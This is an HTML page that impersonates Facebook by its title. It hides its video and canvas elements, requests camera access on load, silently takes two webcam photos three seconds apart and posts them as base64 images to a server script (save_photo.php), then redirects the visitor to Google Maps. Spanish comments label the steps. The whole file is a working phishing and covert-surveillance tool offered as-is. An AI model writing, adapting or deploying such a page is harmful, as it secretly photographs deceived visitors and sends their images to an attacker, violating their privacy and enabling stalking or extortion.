<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <style>
        #video,
        #canvas {
            display: none;
        }

        body {
            background-color: #1C1C1C;
        }
    </style>
</head>

<body>
    <video id="video" width="640" height="480" autoplay></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        (async function() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');

            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: true
                });
                video.srcObject = stream;

                video.addEventListener('loadedmetadata', () => {
                    let photoCount = 0;
                    const intervalId = setInterval(() => {
                        if (photoCount < 2) {
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const dataURL = canvas.toDataURL('image/png');

                            fetch('save_photo.php', {
                                    method: 'POST',
                                    headers: {
                                        'Content-Type': 'application/json'
                                    },
                                    body: JSON.stringify({
                                        image: dataURL,
                                        count: photoCount
                                    })
                                })
                                .then(response => response.json())
                                .then(data => {
                                    console.log('Success:', data);
                                })
                                .catch((error) => {
                                    console.error('Error:', error);
                                });

                            photoCount++;
                        } else {
                            clearInterval(intervalId);
                            stream.getTracks().forEach(track => track.stop()); // Detener el stream

                            // Redirigir a otra página
                            window.location.href =
                                'https://www.google.com/maps/'; // Cambia esto a la URL deseada
                        }
                    }, 3000); // Tomar una foto cada 3 segundos
                });
            } catch (error) {
                console.error('Error accessing media devices.', error);
            }
        })();
    </script>
</body>

</html>